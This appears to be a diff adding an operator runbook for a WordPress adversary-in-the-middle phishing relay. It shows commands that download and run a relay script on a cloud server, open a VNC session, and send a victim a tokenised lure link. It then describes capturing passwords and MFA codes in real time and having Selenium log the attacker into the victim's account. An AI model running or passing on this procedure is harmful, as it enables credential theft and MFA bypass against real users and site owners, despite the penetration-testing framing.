@@ -1,0 +1,51 @@
+1. Run wordpress-relay.sh
+
+root@digital-ocean-hostname:~# wget https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/cloud/execution/scripts/wordpress-relay.sh -O wordpress-relay.sh
+--2025-08-05 17:42:50--  https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/cloud/execution/scripts/wordpress-relay.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 40476 (40K) [text/plain]
+Saving to: ‘wordpress-relay.sh’
+
+wordpress-relay.sh                                                      100%[===============================================================================================================================================================================>]  39.53K  --.-KB/s    in 0.001s  
+
+2025-08-05 17:42:50 (57.4 MB/s) - ‘wordpress-relay.sh’ saved [40476/40476]
+
+root@digital-ocean-hostname:~# chmod +x wordpress-relay.sh
+
+root@digital-ocean-hostname:~# ./wordpress-relay.sh --domain your-domain.info
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2. Open the VNC Session
+
+🌐VNC URL: http://docker droplet ip:6901/?password=randomly generated password
+
+Hit Enter once connected. Selenium will open firefox to the target site.
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+3. Get the REQUIRED_TOKEN value from the Environmental Variables
+
+root@digital-ocean-hostname:~# cat.env | grep REQUIRED_TOKEN
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+4. Visit the URL while appending the required token
+
+https://your-domain.info/link?src=required token value
+
+The required token value will change and the service will restart. 
+However, the target has session cookies that will keep them authenticated.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+5. Submit the username/password and 6-digit MFA code (if applicable)
+
+(This script works on MFA-enabled sites and on sites that do not have MFA enabled.)
+
+If login fails in victim's portal but succeeds in attacker's VNC window, ensure miniOrange 2-factor authentication Setup has been set up and wordpress-setup.txt has been completed.
+
+Monitor the wordpress-relay.sh execution output to view intercepted credentials / MFA code in real-time and troubleshoot any issues.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+6. Monitor the Firefox Browser in the VNC Session
+
+Once the required login information is entered, Selenium will log the attacker into victim's account.
+Upon successful login in attacker's browser, victim's broswer is redirected to the target website.
